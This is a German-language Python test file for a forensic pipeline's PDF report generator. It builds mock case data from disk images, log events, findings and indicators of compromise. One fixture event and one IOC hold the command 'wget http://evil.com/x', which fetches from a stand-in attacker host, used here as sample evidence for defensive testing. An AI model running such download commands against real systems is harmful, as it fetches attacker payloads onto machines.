"""Tests fuer den modernen Bericht (stages/report_modern.py).

Erzeugt forensischer_analysebericht.pdf ZUSAETZLICH zu report.pdf —
gespeist aus echten ctx-Daten, defensiv gegen fehlende Felder.
"""
import sys
import tempfile
from pathlib import Path
from datetime import datetime, timezone

sys.path.insert(0, str(Path(__file__).parent.parent))

from models.pipeline_context import PipelineContext
from models.event import ForensicEvent
from models.chain_of_custody import ChainOfCustody
from models.forensic_finding import ForensicFinding
from models.ioc import IOC
from stages.report_modern import build_modern_report

try:
    from pypdf import PdfReader
    HAVE_PYPDF = True
except ImportError:
    HAVE_PYPDF = False


def _case():
    case = Path(tempfile.mkdtemp()) / 'case_test'
    case.mkdir()
    return case


def test_fall_modus_bericht():
    case = _case()
    ctx = PipelineContext(case_dir=case, combined_case=True)
    ctx.coc = ChainOfCustody(file_name='Fall', sha256='', md5='', size_gb=0, start_time=datetime.now())
    ctx.coc.add_evidence('jumpbox.E01', md5='a' * 32, sha1='b' * 40, size_gb=12.4)
    ctx.coc.add_evidence('webserver.E01', md5='c' * 32, size_gb=38.1)
    ctx.evidence_items = [
        {'name': 'jumpbox.E01', 'os_name': 'Ubuntu 22.04', 'hostname': 'jumpbox',
         'file_type': 'E01', 'file_size_gb': 12.4,
         'partition_layout': [{'index': 2, 'offset': 2048, 'fs_type': 'ext4', 'role': 'ROOT/DATA', 'tool': 'tsk', 'os_name': 'Ubuntu'}],
         'partition_profiles': [{'is_primary': True, 'partition_index': 2, 'offset': 2048}]},
        {'name': 'webserver.E01', 'os_name': 'CentOS 7', 'hostname': 'web01',
         'file_type': 'E01', 'file_size_gb': 38.1, 'partition_layout': [],
         'partition_profiles': [{}]},
    ]
    ctx.normalized_events = [
        ForensicEvent(timestamp=datetime(2024, 5, 1, 14, 2, tzinfo=timezone.utc),
                      source='auth', event_type='ssh', message='Login admin', severity='medium',
                      evidence='jumpbox.E01', orig_path='/var/log/auth.log'),
        ForensicEvent(timestamp=datetime(2024, 5, 1, 14, 5, tzinfo=timezone.utc),
                      source='bash_history', event_type='cmd', message='wget http://evil.com/x', severity='high',
                      evidence='webserver.E01', orig_path='/root/.bash_history'),
    ]
    ctx.forensic_findings = [ForensicFinding(severity='CRITICAL', rule='Lateral Movement',
                             file='/root/x.sh', description='Test', anomaly_time=datetime(2024, 5, 1, tzinfo=timezone.utc))]
    ctx.iocs = [IOC(type='url', value='http://evil.com/x', source='bash_history', context='wget')]
    ctx.antiforensics_hits = [{'type': 'log_deletion', 'file': '/var/log/auth.log', 'details': '>', 'severity': 'critical'}]
    ctx.parser_stats = {'mactime': 142038, 'auth': 169}
    ctx.parsed_events = 214508
    ctx.stage_status = {'quality': 'SEHR GUT'}

    build_modern_report(ctx, case)
    pdf = case / 'forensischer_analysebericht.pdf'
    assert pdf.exists()

    if HAVE_PYPDF:
        txt = '\n'.join(p.extract_text() for p in PdfReader(str(pdf)).pages)
        assert 'jumpbox.E01' in txt and 'webserver.E01' in txt
        assert 'Lateral Movement' in txt
        assert 'SEHR GUT' in txt


def test_einzel_image_bericht():
    case = _case()
    ctx = PipelineContext(case_dir=case, combined_case=False)
    ctx.disk_image_path = Path('disk.E01')
    ctx.os_name = 'Debian 12'; ctx.hostname = 'srv'; ctx.file_type = 'E01'; ctx.file_size_gb = 10.0
    ctx.sha256 = 'e' * 64; ctx.md5 = 'f' * 32
    ctx.coc = ChainOfCustody(file_name='disk.E01', sha256='e' * 64, md5='f' * 32, size_gb=10.0, start_time=datetime.now())
    ctx.coc.add_evidence('disk.E01', md5='f' * 32, sha256='e' * 64, size_gb=10.0)
    build_modern_report(ctx, case)
    assert (case / 'forensischer_analysebericht.pdf').exists()


def test_leere_daten_bricht_nicht():
    """Minimaler ctx — der Bericht muss trotzdem erzeugt werden."""
    case = _case()
    ctx = PipelineContext(case_dir=case)
    ctx.disk_image_path = Path('x.dd')
    build_modern_report(ctx, case)
    # darf nicht crashen; PDF wird erzeugt sofern reportlab da ist
    assert (case / 'forensischer_analysebericht.pdf').exists()
